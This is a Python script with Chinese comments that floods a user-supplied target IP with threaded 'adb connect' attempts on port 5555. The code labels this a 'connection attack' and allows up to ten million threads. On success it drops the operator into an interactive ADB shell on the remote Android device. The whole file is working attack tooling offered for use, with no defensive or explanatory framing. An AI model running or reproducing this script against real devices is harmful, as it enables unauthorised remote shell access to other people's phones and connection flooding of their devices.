import subprocess
import threading
import time
import psutil
from datetime import datetime


class AdbConnector:
    def __init__(self, ip):
        self.ip = ip
        self.stop_event = threading.Event()
        self.success_event = threading.Event()
        self.connected_device = None
        self.lock = threading.Lock()
        self.threads = []
        self.active_threads = 0
        self.max_threads = 10000000
        self.resource_check_interval = 0.01

        # 监控指标
        self.start_time = time.time()
        self.total_requests = 0
        self.last_requests = 0
        self.request_rate = 0
        self.latency_sum = 0
        self.latency_count = 0
        self.net_sent_last = 0
        self.net_recv_last = 0

    def _get_system_status(self):
        """获取系统资源使用情况"""
        return (
            psutil.cpu_percent(interval=0.1),
            psutil.virtual_memory().percent,
            psutil.net_io_counters().bytes_sent,
            psutil.net_io_counters().bytes_recv
        )

    def _adb_connect(self, port=5555):
        """尝试ADB连接并返回结果和延迟"""
        start = time.time()
        try:
            result = subprocess.run(
                ['adb', 'connect', f'{self.ip}:{port}'],
                capture_output=True,
                text=True,
                timeout=2
            )
            latency = (time.time() - start) * 1000  # 转换为毫秒

            with self.lock:
                self.total_requests += 1
                self.latency_sum += latency
                self.latency_count += 1

            return result.stdout.strip(), latency
        except Exception as e:
            latency = (time.time() - start) * 1000
            with self.lock:
                self.total_requests += 1
                self.latency_sum += latency
                self.latency_count += 1
            return str(e), latency

    def _connection_worker(self):
        """工作线程执行持续连接尝试"""
        start_time = time.time()
        while not self.stop_event.is_set():
            if time.time() - start_time > 30:
                break

            response, latency = self._adb_connect()
            if 'connected' in response.lower():
                with self.lock:
                    if not self.success_event.is_set():
                        self.connected_device = f'{self.ip}:5555'
                        self.success_event.set()
                        self.stop_event.set()
                break
            time.sleep(0.1)

        with self.lock:
            self.active_threads -= 1

    def _resource_manager(self):
        """资源管理线程"""
        while not self.stop_event.is_set():
            cpu, mem, _, _ = self._get_system_status()

            if cpu < 80 and mem < 90:
                with self.lock:
                    available_slots = min(
                        self.max_threads - self.active_threads,
                        5
                    )
                    for _ in range(available_slots):
                        if self.active_threads >= self.max_threads:
                            break
                        thread = threading.Thread(target=self._connection_worker)
                        thread.start()
                        self.threads.append(thread)
                        self.active_threads += 1

            time.sleep(self.resource_check_interval)

    def _status_monitor(self):
        """实时状态显示线程"""
        while not self.stop_event.is_set():
            try:
                elapsed = time.time() - self.start_time
                remaining = max(30 - elapsed, 0)

                with self.lock:
                    current_active = self.active_threads
                    total_req = self.total_requests
                    req_rate = total_req - self.last_requests
                    self.last_requests = total_req
                    avg_latency = self.latency_sum / self.latency_count if self.latency_count else 0
                    self.latency_sum = self.latency_count = 0

                # 获取网络和系统状态
                cpu, mem, net_sent, net_recv = self._get_system_status()
                sent_rate = (net_sent - self.net_sent_last) / 1024
                recv_rate = (net_recv - self.net_recv_last) / 1024
                self.net_sent_last = net_sent
                self.net_recv_last = net_recv

                # 构建状态信息
                status = f"""
[倒计时] {remaining:.1f}s | [线程] {current_active} | [CPU] {cpu:.1f}% | [内存] {mem:.1f}%
[请求总数] {total_req} | [请求速率] {req_rate}/s | [平均延迟] {avg_latency:.1f}ms
[网络流量] 发送: {sent_rate:.1f}KB/s | 接收: {recv_rate:.1f}KB/s
                """.strip()

                # 清屏并输出
                print("\033[2J\033[H")
                print("=== 实时连接状态监控 ===")
                print(status)

            except:
                break

    def start_connection_attack(self):
        """启动连接攻击"""
        # 资源管理线程
        manager_thread = threading.Thread(target=self._resource_manager)
        manager_thread.start()
        self.threads.append(manager_thread)

        # 状态监控线程
        status_thread = threading.Thread(target=self._status_monitor)
        status_thread.start()
        self.threads.append(status_thread)

    def wait_for_result(self):
        """等待连接结果"""
        try:
            while not self.stop_event.is_set():
                time.sleep(10)
                if self.success_event.is_set():
                    return self.connected_device
        except KeyboardInterrupt:
            self.stop_event.set()
            return None
        return None


def adb_shell(device):
    """进入交互式ADB shell"""
    print("\n进入ADB交互模式（输入'exit'退出）:")
    while True:
        try:
            cmd = input(f"adb@{device} $ ").strip()
            if cmd.lower() == 'exit':
                break
            if cmd:
                subprocess.run(['adb', '-s', device] + cmd.split(), check=True)
        except (KeyboardInterrupt, subprocess.CalledProcessError):
            break


def main():
    # 依赖检查
    try:
        import psutil
    except ImportError:
        print("请先安装psutil模块：pip install psutil")
        return

    target_ip = input("请输入目标设备IP地址: ").strip()

    print("\n正在启动ADB连接...")
    print("系统将自动调节线程数量维持资源占用在安全范围内")
    print("系统资源（CPU<80%, 内存<90%）...")

    connector = AdbConnector(target_ip)
    connector.start_connection_attack()

    if device := connector.wait_for_result():
        print(f"\n[+] 成功连接到设备: {device}")
        adb_shell(device)
    else:
        print("\n[-] 连接尝试失败，可能原因：")
        print("1. 设备未开启调试模式")
        print("2. 网络连接异常")
        print("3. 未执行adb tcpip 5555初始化")


if __name__ == "__main__":
    main()